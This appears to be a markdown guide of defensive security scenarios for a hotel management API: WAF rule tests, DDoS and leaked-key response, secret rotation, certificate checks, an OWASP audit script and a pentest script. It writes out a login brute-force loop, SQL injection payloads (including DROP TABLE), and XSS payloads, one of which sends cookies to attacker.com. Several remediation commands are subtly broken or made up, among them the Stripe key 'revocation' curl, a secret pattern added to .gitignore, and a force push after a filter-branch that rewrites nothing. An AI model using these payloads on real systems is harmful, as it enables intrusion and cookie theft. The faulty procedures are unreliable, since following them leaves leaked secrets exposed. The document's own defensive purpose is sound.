# Security Hardening Examples (Gap #8)

Real-world scenarios, attack simulations, and mitigation demonstrations.

---

## Table of Contents

1. [WAF Rule Testing](#waf-rule-testing)
2. [Attack Scenarios & Mitigation](#attack-scenarios--mitigation)
3. [Secret Management Workflows](#secret-management-workflows)
4. [Encryption Verification](#encryption-verification)
5. [Certificate Management](#certificate-management)
6. [Incident Response Procedures](#incident-response-procedures)
7. [Security Compliance Audits](#security-compliance-audits)
8. [Penetration Testing](#penetration-testing)

---

## WAF Rule Testing

### Scenario 1: Rate Limiting Attack Prevention

**Situation:** A malicious actor attempts to brute-force login by sending 5000 requests in 5 minutes from a single IP.

**WAF Response:**

```bash
# Attacker sends rapid requests
for i in {1..5000}; do
  curl -s https://api.example.com/api/v1/auth/login \
    -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"attempt$i\"}" &
done
wait

# After 2000 requests (threshold), remaining requests blocked
# Response: HTTP/1.1 429 Too Many Requests
# Block lasts for 5-minute window

# CloudWatch log entry:
# {
#   "action": "BLOCK",
#   "terminatingRuleId": "RateLimit",
#   "httpsourceipaddress": "203.0.113.77",
#   "ratebasedrulelist": [...],
#   "timestamp": 1705334400000
# }
```

**Verification:**

```bash
# Query CloudWatch for rate-limit blocks
aws logs filter-log-events \
  --log-group-name /aws/waf/nephele-hms/prod \
  --filter-pattern '{ $.terminatingRuleId = "RateLimit" }' \
  --start-time $(date -d '1 hour ago' +%s)000 | jq '.events | length'

# Output: 3 (3 rate-limit blocks in last hour)

# Check CloudWatch metric
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions Name=WebACL,Value=nephele-hms-prod \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 300 \
  --statistics Sum
```

**Recovery:**

```bash
# Rate limit automatically resets after 5 minutes
# No action needed - attacker blocked until timeout

# Monitor for continued attempts
aws logs tail /aws/waf/nephele-hms/prod --follow | grep "203.0.113.77"

# If attack continues from multiple IPs:
# 1. Check pattern (distributed attack)
# 2. Increase Shield Advanced protection
# 3. Contact AWS DDoS protection team
```

---

### Scenario 2: SQL Injection Attempt Blocked

**Situation:** Attacker attempts SQL injection on user search endpoint.

**Attack Request:**

```bash
# SQL injection attempt: Return all users
curl -X GET "https://api.example.com/api/v1/guests?name=admin' OR '1'='1" \
  -H "Authorization: Bearer token"

# WAF matches: AWS Managed SQL Injection Rule
# Action: BLOCK
# Response: HTTP/1.1 403 Forbidden
```

**WAF Detection:**

```json
{
  "action": "BLOCK",
  "terminatingRuleId": "SQL_INJECTION_RULE",
  "httpsourceipaddress": "203.0.113.88",
  "uri": "/api/v1/guests",
  "args": "name=admin' OR '1'='1",
  "timestamp": 1705334500000
}
```

**Variations WAF Detects:**

```
1. Union-based:     ?id=1' UNION SELECT * FROM users --
2. Time-based:      ?id=1'; WAITFOR DELAY '00:00:05' --
3. Stacked:         ?id=1; DROP TABLE users; --
4. Boolean-based:   ?id=1' AND 1=1 --
5. Error-based:     ?id=1' AND extractvalue(0, concat(...)) --
6. Encoded:         ?id=1%27%20OR%20%271%27%3D%271
7. Case variation:  ?id=admin' oR '1'='1
```

**All blocked by Rule Set 3: SQL Injection Protection**

**Verification in Application:**

```python
# Proper parameterized query (immune to WAF or not, good practice)
from django.db import connection

def safe_guest_lookup(name):
    with connection.cursor() as cursor:
        cursor.execute(
            "SELECT * FROM guests WHERE name = %s",
            [name]  # Parameter separated from SQL
        )
        return cursor.fetchall()

# Even if attacker bypasses WAF, parameterized queries are safe:
result = safe_guest_lookup("admin' OR '1'='1")
# Result: Query for exact name "admin' OR '1'='1" (treated as literal string)
# Returns: Empty result set (no matching guest)
```

---

### Scenario 3: XSS Attack Prevention

**Situation:** Attacker injects JavaScript into guest comment field.

**Attack Request:**

```bash
# XSS payload in comment
curl -X POST "https://api.example.com/api/v1/reviews" \
  -H "Content-Type: application/json" \
  -d '{
    "guest_id": 123,
    "comment": "<script>alert(\"xss\")</script>",
    "rating": 5
  }'

# WAF matches: Known Bad Inputs Rule Set
# Specific match: Common XSS patterns
# Action: BLOCK
# Response: HTTP/1.1 403 Forbidden
```

**Example Payloads Blocked:**

```javascript
// Basic script injection
"<script>alert('xss')</script>"

// Event handler
"<img src=x onerror='fetch(\"https://attacker.com?c=\"+document.cookie)'>"

// SVG vector
"<svg onload='alert(\"xss\")'></svg>"

// HTML entity encoding bypass
"&#60;script&#62;alert('xss')&#60;/script&#62;"

// Data URL
"<iframe src='data:text/html,<script>alert(\"xss\")</script>'></iframe>"

// Dynamic JavaScript
"<div>Comment: '+eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)+'</div>"

// All detected and blocked by WAF
```

**Application-Level Protection (Defense in Depth):**

```python
# Django automatically escapes output in templates
# Example: {{ guest_comment }} is escaped

# Template rendering:
<div class="review">
  <p>{{ review.comment }}</p>  <!-- Auto-escaped by Django -->
</div>

# If comment contains: <script>alert('xss')</script>
# Rendered as: &lt;script&gt;alert('xss')&lt;/script&gt;
# Displayed as literal text, not executed
```

---

### Scenario 4: Admin Endpoint IP Restriction

**Situation:** Admin staff tries to access /admin/ from new office location.

**Attempt from Non-Whitelisted IP (8.8.8.8):**

```bash
# Request to admin endpoint
curl -H "X-Forwarded-For: 8.8.8.8" https://api.example.com/admin/dashboard

# WAF logs:
# {
#   "action": "BLOCK",
#   "terminatingRuleId": "AdminProtection",
#   "uri": "/admin/dashboard",
#   "httpsourceipaddress": "8.8.8.8"
# }

# Response:
# HTTP/1.1 403 Forbidden
# This admin endpoint requires whitelisted IP access
```

**Attempt from Whitelisted IP (203.0.113.45):**

```bash
# Request to admin endpoint from office
curl -H "X-Forwarded-For: 203.0.113.45" https://api.example.com/admin/dashboard

# WAF logs:
# {
#   "action": "ALLOW",
#   "uri": "/admin/dashboard",
#   "httpsourceipaddress": "203.0.113.45"
# }

# Response:
# HTTP/1.1 200 OK
# Dashboard loads successfully
```

**Adding New Admin IP:**

```bash
# New admin office IP is 203.0.113.100
# Update terraform.tfvars
cat > terraform/terraform.tfvars << EOF
admin_only_ips = [
  "203.0.113.45/32",    # Existing: NYC office
  "203.0.113.100/32"    # New: Remote office
]
EOF

# Deploy update
terraform apply

# Verify in WAF IP Set
aws wafv2 get-ip-set \
  --scope REGIONAL \
  --name admin-only-ips \
  --id <id> | jq '.IPSet.Addresses'

# Output:
# [
#   "203.0.113.45/32",
#   "203.0.113.100/32"
# ]

# New office can now access /admin/*
```

---

### Scenario 5: Geo-Blocking Response

**Situation:** Requests detected from sanctioned country (North Korea).

**Configuration:**

```hcl
enable_geo_blocking = true
blocked_countries = ["KP", "IR", "SY"]  # North Korea, Iran, Syria
```

**Blocked Request:**

```bash
# Attacker in North Korea attempts API request
# IP geolocated to North Korea

curl https://api.example.com/api/v1/bookings

# WAF matches: GeoBlockingRule
# Country: KP (North Korea)
# Action: BLOCK
# Response: HTTP/1.1 403 Forbidden

# CloudWatch log:
# {
#   "action": "BLOCK",
#   "terminatingRuleId": "GeoBlockingRule",
#   "httpsourceasnumber": "AS131279",  # North Korean ISP
#   "timestamp": 1705334600000
# }
```

**Legitimate User from Blocked Country:**

```bash
# If legitimate business partner is in blocked country,
# temporarily disable geo-blocking for testing:

terraform apply -var="enable_geo_blocking=false"

# Or whitelist specific IP:
terraform apply \
  -var="enable_geo_blocking=true" \
  -var='waf_whitelist_ips=["203.0.113.200/32"]'  # Partner IP
```

---

## Attack Scenarios & Mitigation

### Scenario 6: Distributed DDoS Attack

**Situation:** Large-scale DDoS attack from botnet (50,000 RPS from 10,000 IPs).

**Attack Pattern:**

```
Time      RPS     Blocked    Allowed    Status
T+0:00    10k     -          10k        ✅ Within limits
T+1:00    50k     30k        20k        ⚠️  Rate limiting active
T+2:00    100k    80k        20k        🚨 Alarms triggered
T+3:00    80k     60k        20k        🛡️  Shield Advanced mitigates
T+4:00    10k     -          10k        ✅ Attack subsides
```

**AWS Response (Automatic with Shield Advanced):**

```
Layer 1: AWS Shield Standard (always on)
  └─ Detects volumetric attack immediately
  └─ Starts automated DDoS mitigation
  └─ Drops traffic at edge, before reaching ALB

Layer 2: WAF Rate Limiting
  └─ Blocks IPs exceeding threshold
  └─ Returns 429 to attackers
  └─ Legitimate users still get through

Layer 3: CloudWatch Alarms
  └─ System notifies ops team
  └─ Escalates to DDoS response team
  └─ Optional manual intervention
```

**CloudWatch Metrics During Attack:**

```bash
# Monitor DDoS in real-time
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 \
  --metric-name BlockedRequests \
  --dimensions Name=WebACL,Value=nephele-hms-prod \
  --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 60 \
  --statistics Sum,Average

# Output shows spike in BlockedRequests
```

**Operators Response:**

```bash
# 1. Check alarm status
aws cloudwatch describe-alarms --alarm-names nephele-hms-waf-blocked-requests

# 2. Review top attacking IPs
aws logs insights query \
  --log-group-name /aws/waf/nephele-hms/prod \
  --query-string 'fields @timestamp, httpsourceipaddress, action
    | filter action = "BLOCK"
    | stats count() as blocks by httpsourceipaddress
    | sort blocks desc
    | limit 20'

# Sample output:
# httpSourceIpAddress   blocks
# 203.0.113.10          2543
# 203.0.113.11          2501
# 203.0.113.12          2487
# ... (from 10,000 unique IPs)

# 3. If specific IP range detected:
# Temporarily block with iptables (VPC level)
# Or enhance WAF rules

# 4. Contact AWS DDoS Response Team
# (ARN: arn:aws:iam::aws:policy/DDoS/ResponseTeamAccess)
```

**Post-Attack Analysis:**

```bash
# Export logs for forensic analysis
aws logs describe-log-streams \
  --log-group-name /aws/waf/nephele-hms/prod \
  --start-time $(date -d '1 hour ago' +%s)000 \
  --end-time $(date +%s)000 \
  | jq '.logStreams[0].logStreamName' > /tmp/attack_stream.txt

# Download full attack logs
aws logs get-log-events \
  --log-group-name /aws/waf/nephele-hms/prod \
  --log-stream-name $(cat /tmp/attack_stream.txt) \
  > /tmp/attack_details.json

# Analyze attack pattern
jq '.events[] | select(.message | contains("BLOCK"))
  | fromjson
  | {timestamp, httpsourceipaddress, uri, action}' /tmp/attack_details.json | head -20
```

---

### Scenario 7: Credential Compromise Response

**Situation:** Stripe API key exposed in GitHub repository history.

**Discovery:**

```bash
# Security scanning tool detects exposed secret
# Tool: git-secrets (detects common patterns)

git secrets --scan

# Output:
# Potential secrets in commits:
# <omitted> (Stripe secret key)
# Location: commit abc123:src/settings.py
```

**Immediate Response:**

```bash
# 1. Revoke exposed key at provider (Stripe console)
# Navigate to: https://dashboard.stripe.com/settings/apikeys
# Or via API:
curl https://api.stripe.com/v1/api_keys \
  -u sk_live_xxx: \
  -X POST \
  -d "refine[0][operator]=equals" \
  -d "refine[0][property]=status" \
  -d "refine[0][value]=enabled"

# 2. Generate new key in Stripe

# 3. Update Secrets Manager
aws secretsmanager update-secret \
  --secret-id nephele-hms/api/keys-prod \
  --secret-string '{
    "stripe_secret": "sk_live_NEW_KEY_HERE",
    "stripe_publishable": "pk_live_..."
  }'

# 4. ECS tasks automatically load new key on restart
# Or manually restart:
aws ecs update-service \
  --cluster nephele-hms \
  --service api \
  --force-new-deployment

# 5. Audit what the old key accessed
# Stripe API: /v1/charges?limit=100&created[gte]=1705000000
# Check transactions for anomalies

# 6. Add to prevent future leaks
echo "sk_live_.*" >> .gitignore
git-secrets --install
```

**Prevention Measures:**

```bash
# 1. Scan repository history
git-secrets --install -f

# 2. Configure scan patterns
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
git-secrets --pre_commit_hook -- "$@"
EOF
chmod +x .git/hooks/pre-commit

# 3. Remove from history (if committed)
git filter-branch --tree-filter '
  if grep -r "sk_live_" .; then
    echo "Exposed secrets detected!" && exit 1
  fi
'

# 4. Force push fixed history
git push -f
```

---

## Secret Management Workflows

### Scenario 8: Automatic Database Password Rotation

**Situation:** Monthly automatic rotation of database password.

**Timeline:**

```
T-30:00  Rotation scheduled for 30 days later
T-:00    AWS initiates automatic rotation
T+:05    New password generated in Secrets Manager
T+:10    RDS password updated (old still works for 30 min)
T+:15    New version marked as "AWSCURRENT"
T+:20    Old version marked as "AWSPREVIOUS"
T+:30    Old version becomes "DEPRECATED"
```

**Application Behavior During Rotation:**

```python
# Django settings.py uses connection pooling

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'CONN_MAX_AGE': 600,  # Connections recycle every 10 min
        'AUTOCOMMIT': True,
    }
}

# During rotation:
# - Existing connections use old password (still valid)
# - After 10 minutes, connection pools reset
# - New connections fetch new password from Secrets Manager
# - Seamless, zero-downtime password rotation
```

**Monitoring Rotation:**

```bash
# Subscribe to rotation events
aws secretsmanager describe-secret \
  --secret-id nephele-hms/database/password-prod \
  --query 'RotationRules'

# View rotation history
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=RotateSecret \
  --query 'Events[?Resources[0].ResourceName==`nephele-hms/database/password-prod`]'

# Output:
# {
#   "EventTime": "2024-01-15T14:00:00Z",
#   "EventName": "RotateSecret",
#   "Username": "secretsmanager",
#   "CloudTrailEvent": {
#     "requestParameters": {
#       "secretId": "nephele-hms/database/password-prod",
#       "clientRequestToken": "..."
#     }
#   }
# }

# Monitor rotation failures
aws cloudwatch get-metric-statistics \
  --namespace AWS/SecretsManager \
  --metric-name RotationFailure \
  --dimensions Name=SecretId,Value=nephele-hms/database/password-prod \
  --start-time $(date -u -d '30 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 86400 \
  --statistics Sum
```

**If Rotation Fails:**

```bash
# 1. Check rotation status
aws secretsmanager describe-secret \
  --secret-id nephele-hms/database/password-prod \
  --query 'RotationDetails'

# 2. View Lambda execution logs (if custom rotation)
# Or check AWS managed rotation status

# 3. Manually trigger rotation
aws secretsmanager rotate-secret \
  --secret-id nephele-hms/database/password-prod \
  --rotation-rules AutomaticallyAfterDays=1

# 4. Verify RDS password updated
aws rds describe-db-instances \
  --db-instance-identifier nephele-hms-prod-db \
  --query 'DBInstances[0].MasterUserStatus'
```

---

### Scenario 9: Emergency Secret Reset

**Situation:** Administrator needs to reset all secrets immediately (breach concern).

**Procedure:**

```bash
# 1. Create new secrets with random values
NEW_DB_PASSWORD=$(openssl rand -base64 32)
NEW_API_KEY=$(openssl rand -hex 32)

# 2. Update all secrets
aws secretsmanager update-secret \
  --secret-id nephele-hms/database/password-prod \
  --secret-string "{\"password\":\"$NEW_DB_PASSWORD\"}"

aws secretsmanager update-secret \
  --secret-id nephele-hms/api/keys-prod \
  --secret-string "{\"stripe_secret\":\"$NEW_API_KEY\"}"

# 3. Update RDS master password
aws rds modify-db-instance \
  --db-instance-identifier nephele-hms-prod-db \
  --master-user-password "$NEW_DB_PASSWORD" \
  --apply-immediately

# 4. Restart ECS tasks to load new secrets
aws ecs update-service \
  --cluster nephele-hms \
  --service api \
  --force-new-deployment

# 5. Monitor for errors
aws logs tail /ecs/nephele-hms-api --follow | grep -i "error\|failed"

# 6. Verify application connectivity
curl -H "Authorization: Bearer $NEW_API_KEY" https://api.example.com/health
# Expected: HTTP 200 OK
```

---

## Encryption Verification

### Scenario 10: Verify All Data at Rest Encrypted

**Verification Checklist:**

```bash
# 1. RDS Database Encryption
aws rds describe-db-instances \
  --db-instance-identifier nephele-hms-prod-db \
  --query 'DBInstances[0].[DBInstanceIdentifier,StorageEncrypted,KmsKeyId]'

# Expected output:
# [
#   "nephele-hms-prod-db",
#   true,
#   "arn:aws:kms:us-east-1:123456789012:key/12345678-..."
# ]

# 2. EBS Volume Encryption
aws ec2 describe-volumes \
  --filters "Name=tag:Name,Values=nephele-hms*" \
  --query 'Volumes[*].[VolumeId,Encrypted,KmsKeyId]'

# Expected: All volumes show Encrypted: true

# 3. S3 Bucket Encryption
aws s3api get-bucket-encryption --bucket nephele-hms-backups-prod

# Expected:
# {
#   "ServerSideEncryptionConfiguration": {
#     "Rules": [{
#       "ApplyServerSideEncryptionByDefault": {
#         "SSEAlgorithm": "aws:kms",
#         "KMSMasterKeyID": "arn:aws:kms:us-east-1:..."
#       }
#     }]
#   }
# }

# 4. Secrets Manager Encryption
aws secretsmanager describe-secret \
  --secret-id nephele-hms/database/password-prod \
  --query 'KmsKeyId'

# Expected: arn:aws:kms:us-east-1:...

# 5. KMS Key Status
aws kms describe-key --key-id alias/nephele-hms-prod \
  --query 'KeyMetadata.[KeyState,KeyRotationEnabled]'

# Expected:
# [
#   "Enabled",
#   true
# ]
```

**Encryption Test:**

```bash
# Test KMS encryption with new data
aws kms encrypt \
  --key-id alias/nephele-hms-prod \
  --plaintext "sensitive data" \
  --query 'CiphertextBlob' \
  --output text > /tmp/encrypted.txt

# Verify only KMS can decrypt
ENCRYPTED=$(cat /tmp/encrypted.txt)
aws kms decrypt \
  --ciphertext-blob $ENCRYPTED \
  --query 'Plaintext' \
  --output text | base64 --decode

# Output: sensitive data
```

---

## Certificate Management

### Scenario 11: ACM Certificate Renewal

**Automatic Renewal Process (should be automatic, but verify):**

```bash
# 1. Check certificate status
aws acm describe-certificate \
  --certificate-arn arn:aws:acm:us-east-1:123456789012:certificate/abc123 \
  | jq '{
    DomainName,
    Status: CertificateStatus,
    Expiration: NotAfter,
    DaysToExpiry: "(.NotAfter | todateiso8601 | now - (. | fromdate) | . / 86400 | floor)",
    RenewalEligibility
  }'

# Output:
# {
#   "DomainName": "api.example.com",
#   "Status": "ISSUED",
#   "Expiration": "2025-01-15T23:59:59Z",
#   "DaysToExpiry": 356,
#   "RenewalEligibility": "Eligible"
# }

# 2. Monitor renewal in CloudTrail
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=RequestCertificate \
  --query 'Events[?Resources[0].ResourceName==`api.example.com`]'

# 3. If renewal failing, check DNS validation
aws route53 list-resource-record-sets \
  --hosted-zone-id Z123456 \
  --query 'ResourceRecordSets[?Name==`_acm-validations.api.example.com`]'

# 4. If DNS records missing, Terraform should create them:
terraform apply

# 5. Verify renewal complete
aws acm describe-certificate \
  --certificate-arn <arn> \
  --query 'Certificate.RenewalSummary'

# Expected: renewal_status = "SUCCESS"
```

### Scenario 12: Certificate Chain Validation

**Verify complete trust chain:**

```bash
# 1. Check certificate details
openssl s_client -connect api.example.com:443 -showcerts < /dev/null | \
  openssl x509 -text -noout

# 2. Verify issuer chain
echo | openssl s_client -connect api.example.com:443 | \
  openssl x509 -noout -text | grep -A 5 "Issuer:"

# Expected issuer: Amazon (or Let's Encrypt for older certs)

# 3. Check certificate validity dates
echo | openssl s_client -connect api.example.com:443 | \
  openssl x509 -noout -dates

# Output:
# notBefore=Jan 15 00:00:00 2024 GMT
# notAfter=Jan 15 23:59:59 2025 GMT

# 4. Validate Subject Alternative Names (SANs)
echo | openssl s_client -connect api.example.com:443 | \
  openssl x509 -noout -text | grep -A 1 "Subject Alternative Name"

# Expected:
# Subject Alternative Name:
#   DNS:api.example.com, DNS:nephele-hotels.com, DNS:*.nephele-hotels.com

# 5. Test with curl
curl -v https://api.example.com/ 2>&1 | grep "certificate\|issuer\|Verify"

# Expected:
# * Connected to api.example.com (IP) port 443 (#0)
# * Server certificate:
# *   subject: CN=api.example.com
# *   issuer: C=US; O=Amazon; CN=Amazon RSA 2048 M01
# *   SSL certificate verify ok.
```

---

## Incident Response Procedures

### Scenario 13: WAF False Positive

**Situation:** Legitimate feature blocked by WAF rule.

**Example:** File upload feature blocked by "Known Bad Inputs" rule

**Detection:**

```bash
# Support ticket: "File upload failing with 403"
# Check WAF logs

aws logs filter-log-events \
  --log-group-name /aws/waf/nephele-hms/prod \
  --filter-pattern '{ $.uri = "/api/v1/documents/upload" && $.action = "BLOCK" }' \
  --start-time $(date -d '2 hours ago' +%s)000 | jq '.events[0].message | fromjson'

# Output:
# {
#   "action": "BLOCK",
#   "terminatingRuleId": "KnownBadInputsRule",
#   "uri": "/api/v1/documents/upload",
#   "httpmethod": "POST",
#   "httpsourceipaddress": "203.0.113.100"
# }
```

**Root Cause:**

```bash
# Check what triggered the rule
aws wafv2 get-sampled-requests \
  --web-acl-arn <acl-arn> \
  --rule-name KnownBadInputsRule \
  --scope REGIONAL \
  --time-window StartTime=<time>,EndTime=<time> \
  --max-items 20 | jq '.SampledRequests[] | select(.Request.URI=="/api/v1/documents/upload")'

# Payload inspection shows file name triggers rule:
# filename: "report_union_select_2024.pdf"
# ^-- Contains "union_select", matches SQL injection pattern

# False positive: legitimate PDF filename
```

**Resolution:**

```bash
# Option 1: Update file naming validation (app-level)
def validate_filename(filename):
    # Reject suspicious patterns
    forbidden = ["union", "select", "drop", "delete"]
    if any(pattern in filename.lower() for pattern in forbidden):
        raise ValidationError("Invalid filename")
    return filename

# Option 2: Create WAF exception rule
# (Lower priority than SQL injection rule)
# Allow POST to /api/v1/documents/upload from dev team

# Option 3: Temporarily disable problematic rule
aws wafv2 update-web-acl \
  --name nephele-hms \
  --scope REGIONAL \
  --id <id> \
  --rules '[... rules with KnownBadInputsRule disabled ...]'

# Option 4: Add rule scope-down statement
# Apply rule to all EXCEPT /api/v1/documents/upload

# After fix, monitor:
aws logs tail /aws/waf/nephele-hms/prod --follow | grep "documents/upload"
# Should see: "action": "ALLOW"
```

---

### Scenario 14: Security Group Misconfiguration

**Situation:** Database access failing due to security group rules.

**Error:**

```
psycopg2.OperationalError: fe_sendauth: no password supplied
# Actually: Connection timeout
```

**Investigation:**

```bash
# 1. Check ECS security group
aws ec2 describe-security-groups \
  --group-ids sg-ecs-app \
  --query 'SecurityGroups[0].IpPermissions'

# Output shows no rule for RDS port 5432

# 2. Check RDS security group
aws ec2 describe-security-groups \
  --group-ids sg-rds \
  --query 'SecurityGroups[0].IpPermissions'

# Output shows inbound rule missing for ECS app SG

# 3. Verify ALB is blocking
aws ec2 describe-security-groups \
  --group-ids sg-alb \
  --query 'SecurityGroups[0].IpPermissions'

# 4. Test port connectivity
nc -zv nephele-hms-prod-db.c9akciq32.us-east-1.rds.amazonaws.com 5432
# Expected: succeeded
# If failed: Security group blocking
```

**Fix:**

```bash
# Add inbound rule to RDS security group
aws ec2 authorize-security-group-ingress \
  --group-id sg-rds \
  --protocol tcp \
  --port 5432 \
  --source-group sg-ecs-app

# Verify ECS can reach RDS
aws ecs exec \
  --cluster nephele-hms \
  --task <task-id> \
  --container api \
  --interactive \
  --command "/bin/bash"

# Inside container:
psql -h nephele-hms-prod-db.c9akciq32.us-east-1.rds.amazonaws.com -U postgres -d postgres
# Expected: Connection successful
```

---

## Security Compliance Audits

### Scenario 15: OWASP Compliance Audit

**Audit Checklist:**

```bash
#!/bin/bash
# security_audit.sh

echo "=== OWASP Top 10 Compliance Audit ==="

# A01: Broken Access Control
echo -n "A01 Access Control: "
if aws wafv2 describe-web-acl --name nephele-hms --scope REGIONAL \
   | grep -q "AdminProtection"; then
  echo "✅ IP whitelisting enabled"
else
  echo "❌ Admin IP restriction missing"
fi

# A02: Cryptographic Failures
echo -n "A02 Encryption: "
if aws rds describe-db-instances --db-instance-identifier nephele-hms-prod-db \
   | grep -q '"StorageEncrypted": true'; then
  echo "✅ RDS encryption enabled"
else
  echo "❌ RDS encryption disabled"
fi

# Check TLS
if echo | openssl s_client -connect api.example.com:443 2>/dev/null | grep -q "TLSv1.[23]"; then
  echo "✅ TLS 1.2+ enabled"
else
  echo "❌ TLS version too old"
fi

# A03: Injection
echo -n "A03 Injection Protection: "
if aws wafv2 describe-web-acl --name nephele-hms --scope REGIONAL \
   | grep -q "SQLiRule"; then
  echo "✅ SQL injection rules enabled"
else
  echo "❌ SQL injection rules missing"
fi

# A04: Insecure Design
echo -n "A04 Secure Design: "
if [ -f "terraform/security.tf" ]; then
  echo "✅ Infrastructure as Code"
else
  echo "❌ IaC validation failed"
fi

# A05: Security Misconfiguration
echo -n "A05 Configuration: "
MISCONFIGS=$(aws ec2 describe-security-groups \
  --filters "Name=tag:Name,Values=nephele-hms*" \
  --query 'SecurityGroups[?IpPermissions[].IpRranges[].[CidrIp]]' \
  | grep -c "0.0.0.0/0")
if [ $MISCONFIGS -eq 0 ]; then
  echo "✅ No overly permissive rules"
else
  echo "⚠️  Review 0.0.0.0/0 rules"
fi

# A08: Data Integrity
echo -n "A08 Data Protection: "
if aws secretsmanager list-secrets | grep -q "nephele-hms/database/password"; then
  echo "✅ Secrets Manager in use"
else
  echo "❌ Secrets not protected"
fi

# A09: Logging
echo -n "A09 Logging: "
if aws wafv2 describe-web-acl --name nephele-hms --scope REGIONAL \
   | grep -q "CloudWatchLogsConfig"; then
  echo "✅ Logging enabled"
else
  echo "❌ WAF logging disabled"
fi

echo ""
echo "Audit complete"
```

**Run Audit:**

```bash
chmod +x security_audit.sh
./security_audit.sh

# Output:
# === OWASP Top 10 Compliance Audit ===
# A01 Access Control: ✅ IP whitelisting enabled
# A02 Encryption: ✅ RDS encryption enabled
# A02 Encryption: ✅ TLS 1.2+ enabled
# A03 Injection Protection: ✅ SQL injection rules enabled
# A04 Secure Design: ✅ Infrastructure as Code
# A05 Configuration: ✅ No overly permissive rules
# A08 Data Protection: ✅ Secrets Manager in use
# A09 Logging: ✅ Logging enabled
#
# Audit complete
```

---

## Penetration Testing

### Scenario 16: Internal Penetration Test

**Setup:** Authorize security team to test defenses

**Test Plan:**

```bash
#!/bin/bash
# pentest.sh - Authorized penetration testing

echo "=== Authorized Penetration Test ==="
TARGET="https://api.example.com"

# Test 1: SQL Injection
echo "Test 1: SQL Injection..."
curl -s "${TARGET}/api/v1/guests?id=1' OR '1'='1" -H "Authorization: Bearer $TOKEN" | grep -q "403" && echo "✅ Blocked" || echo "❌ Allowed"

# Test 2: XSS Injection
echo "Test 2: XSS..."
curl -s -X POST "${TARGET}/api/v1/reviews" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment":"<script>alert(1)</script>"}' | grep -q "403" && echo "✅ Blocked" || echo "❌ Allowed"

# Test 3: Rate Limiting
echo "Test 3: Rate Limiting..."
for i in {1..2100}; do
  curl -s "${TARGET}/api/v1/health" > /dev/null &
done
wait
# After 2000 requests: Should see 429 Responses

# Test 4: Admin Access Control
echo "Test 4: Admin Access..."
curl -s -H "X-Forwarded-For: 203.0.113.45" "${TARGET}/admin/dashboard" | grep -q "200" && echo "✅ Allowed (whitelisted)" || echo "❌ Blocked"
curl -s -H "X-Forwarded-For: 8.8.8.8" "${TARGET}/admin/dashboard" | grep -q "403" && echo "✅ Blocked (not whitelisted)" || echo "❌ Allowed"

# Test 5: HTTPS Enforcement
echo "Test 5: HTTPS..."
curl -s -L http://${TARGET#https://} | grep -q "301\|https" && echo "✅ Redirects to HTTPS" || echo "❌ No redirect"

# Test 6: Certificate Validation
echo "Test 6: Certificate..."
openssl s_client -connect ${TARGET#https://}:443 < /dev/null 2>&1 | grep -q "Verify return code: 0" && echo "✅ Valid certificate" || echo "❌ Certificate issue"

# Test 7: Secrets Not Exposed
echo "Test 7: Secrets..."
curl -s "${TARGET}/api/v1/config" | grep -q "secret\|password\|key" && echo "❌ Secrets exposed" || echo "✅ Secrets protected"

# Test 8: Insecure Headers
echo "Test 8: Security Headers..."
HEADERS=$(curl -s -I "${TARGET}/api/v1/health")
echo "$HEADERS" | grep -q "X-Content-Type-Options: nosniff" && echo "✅" || echo "❌ Missing X-Content-Type-Options"
echo "$HEADERS" | grep -q "X-Frame-Options" && echo "✅" || echo "❌ Missing X-Frame-Options"
echo "$HEADERS" | grep -q "Strict-Transport-Security" && echo "✅" || echo "❌ Missing HSTS"

echo ""
echo "Penetration test complete"
```

**Run Test (Only with Authorization):**

```bash
chmod +x pentest.sh
./pentest.sh

# Output:
# === Authorized Penetration Test ===
# Test 1: SQL Injection...
# ✅ Blocked
# Test 2: XSS...
# ✅ Blocked
# Test 3: Rate Limiting...
# [2000 requests sent, 100+ 429 responses received]
# Test 4: Admin Access...
# ✅ Allowed (whitelisted)
# ✅ Blocked (not whitelisted)
# Test 5: HTTPS...
# ✅ Redirects to HTTPS
# Test 6: Certificate...
# ✅ Valid certificate
# Test 7: Secrets...
# ✅ Secrets protected
# Test 8: Security Headers...
# ✅
# ✅
# ✅
#
# Penetration test complete
```

---

## Testing Commands Reference

```bash
# WAF Rule Testing
aws wafv2 test-web-acl --web-acl-arn <arn> --request ... --action BLOCK

# CloudWatch Log Analysis
aws logs filter-log-events --log-group-name /aws/waf/... --filter-pattern '...'

# Certificate Validation
openssl s_client -connect api.example.com:443 -showcerts
openssl x509 -in certificate.crt -text -noout

# Encryption Verification
aws kms describe-key --key-id alias/nephele-hms-prod
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,StorageEncrypted]'

# Secrets Audit
aws secretsmanager list-secrets
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Security Group Review
aws ec2 describe-security-groups --group-ids sg-12345
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Access Control Testing
curl -H "X-Forwarded-For: ADMIN_IP" https://api.example.com/admin/
curl -H "X-Forwarded-For: ATTACKER_IP" https://api.example.com/admin/
```

---

## Summary

Gap #8 Examples demonstrate:

✅ **WAF Protection** - Real attack scenarios and mitigation  
✅ **Encryption Verification** - End-to-end data protection  
✅ **Secret Management** - Automatic rotation and breachresponse  
✅ **Certificate Lifecycle** - Renewal and validation  
✅ **Incident Response** - Procedures for security events  
✅ **Compliance Auditing** - OWASP coverage verification  
✅ **Penetration Testing** - Authorized security testing  

All examples include:
- Real-world scenario description
